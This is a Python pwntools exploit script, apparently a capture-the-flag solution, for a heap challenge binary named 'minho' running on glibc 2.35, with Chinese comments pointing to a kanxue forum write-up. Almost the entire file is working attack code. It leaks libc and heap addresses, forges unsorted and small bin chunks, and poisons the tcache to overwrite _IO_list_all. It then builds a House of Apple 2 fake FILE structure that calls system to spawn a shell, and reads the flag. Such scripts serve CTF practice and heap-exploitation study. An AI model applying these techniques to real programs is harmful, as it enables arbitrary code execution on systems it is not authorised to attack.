from pwn import *
 
context.log_level = 'debug'
context.arch = 'amd64'
io = process("./minho")
context.terminal = ["/usr/bin/tmux","sp","-h"]
libc = ELF('/home/yrl/glibc-all-in-one/libs/2.35-0ubuntu3.5_amd64/libc.so.6')

# io = remote("127.0.0.1", 5000)
tob = lambda x: str(x).encode()
 
def add(size, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Size [1=small / 2=big]: ", tob(size))
    io.sendafter(b"Data: ", content)
 
def add2(size_content, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Size [1=small / 2=big]: ", size_content)
    io.sendafter(b"Data: ", content)
 
def show():
    io.sendlineafter(b"> ", b"2")
 
def show2(len):
    io.sendlineafter(b"> ", b"0" * (len-1) + b"2")
 
def show3(len):
    io.sendlineafter(b"> ", b"0" * (len-1) + b"2" + b"\x00")
 
def free():
    io.sendlineafter(b"> ", b"3")
 
def free3(len):
    io.sendlineafter(b"> ", b"0" * (len-1) + b"3")
 
free3(0xd59) # 这一行的作用见上文【伪造Unsorted bin】
# 这一部分信息收集见上文【信息收集】
add(1, b"a" * 0x48 + p64(0xd11))
pause()
show2(0x1000)
free()
add(1, b"a" * 0x50)
show()
io.recvuntil(b"Data: " + b"a" * 0x50)
libc_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x219ce0
libc.address = libc_base
log.success(f"libc_base : {libc_base:#x}")
free()
add(1, b"a" * 0x48 + p64(0xcf1))
 
free()
add(2, b"a")
free()
add(1, b"aaaa")
free()
add(2, b"aaaa")
free()
add(1, b"a" * 0x50)
show()
io.recvuntil(b"Data: " + b"a" * 0x50)
heap_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) << 12
log.success(f"heap_base : {heap_base:#x}")
free()
 
# 见上文【Unlink攻击以及Smallbin伪造攻击实施】
add(1, b"a" * 0x10 + p64(0) + p64(0x31) + p64(heap_base+0x2c0) * 2 +  b"a" * 0x10 + p64(0x30) + p64(0xd00))
free()
add(2, b"a" * 0x50 + p64(0x90) + p64(0x10) + p64(0x00) + p64(0x11))
free()
add(1, flat({
    0x10: 0,
    0x18: 0x91,
    0x20: heap_base + 0x380,
    0x28: libc_base + 0x219ce0,
}, filler=b"\x00"))
 
show2(0x1000)
free()
 
# 见上文【修改Small bin】
add(1, flat({
    0x10 : {
            0x00: 0,
            0x08: 0x91,
            0x10: heap_base + 0x2c0,
            0x18: heap_base + 0x2c0 + 0x30,
             
            0x30: 0,
            0x38: 0x91,
            0x40: heap_base + 0x2c0,
            0x48: heap_base + 0x2c0 + 0x50,
 
            0x50: 0,
            0x58: 0x91,
            0x60: heap_base + 0x2c0 + 0x30,
            0x68: libc_base + 0x219d60
        }
    }
, filler=b"\x00"))
free()
add(2, b"aaaa")
free()
_IO_list_all = libc_base + 0x21a680
system = 0x50d70 + libc_base
 
fake_file = heap_base + 0x2e0
# 见上文House of apple 2中解释
add(1, b"a"*0x10+p64(0) + p64(0x71) + p64((heap_base + 0x2d0 + 0x70)^((heap_base)>>12)))
free()
# 这里是布置House of apple 2
add(2, flat({
    0x0+0x10: b"  sh;",
    0x28+0x10: system,
    0x68: 0x71,
    0x70: _IO_list_all ^((heap_base)>>12),
}, filler=b"\x00"))
free()
add(2, flat({
    0xa0-0x60: fake_file-0x10,
    0xd0-0x60: fake_file+0x28-0x68,
    0xD8-0x60: libc_base + 0x2160C0, # jumptable
}, filler=b"\x00"))
free()
# gdb.attach(io)
pause()
add(2, p64(fake_file))
pause(1)
io.sendline(b"0")
pause(1)
io.sendline(b"cat ./flag*")
 
io.interactive()

# https://bbs.kanxue.com/thread-279588.htm#msg_header_h3_8